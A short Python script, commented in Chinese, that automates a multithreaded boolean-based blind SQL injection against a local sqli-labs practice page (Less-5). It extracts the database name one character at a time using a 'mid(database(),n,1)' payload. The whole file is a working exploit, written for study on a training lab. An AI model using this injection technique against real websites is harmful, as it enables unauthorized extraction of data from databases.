#网上大多是单线程查询，效率过慢，此旨在开发多线程扫描
from turtle import update
from xml.etree.ElementTree import tostring
import requests
import _thread
import time

def thread_check(ipz):
    global jia
    global database_name
    for tail in chars:
        html_head="http://127.0.0.1/sqli-labs/Less-5/?id=1' and mid(database(),"+str(ipz+1)+",1)='"+tail+"' %23"#-->拼接布尔注入的代码
        html_check=requests.get(html_head)
        html_check_bytes=html_check.content
        html_check_str=html_check_bytes.decode()
        if(html_check_str==html_str):
            update_shu=tail+str(ipz)
            database_name[ipz]=tail
            print(database_name)
            jia=jia+1
            break

html = requests.get('http://127.0.0.1/sqli-labs/Less-5/?id=1')#得到一个Response对象
html_bytes = html.content#属性.content用来显示bytes型网页的源代码
html_str = html_bytes.decode()#属性.decode()用来把bytes型的数据解码为字符串型的数据，默认编码格式UTF-8  -->这里存着正确的界面
database_name=[0,0,0,0,0,0,0,0]#根据判断出的database()名的length来定义数组
chars=[]
jia=0
for i in range(97,123):
    chars.append(chr(i))
for ipz in range(8):    
    try:
        _thread.start_new_thread( thread_check, (ipz,) )
    except:
        print ("Error: 无法启动线程")
while 1:
    pass


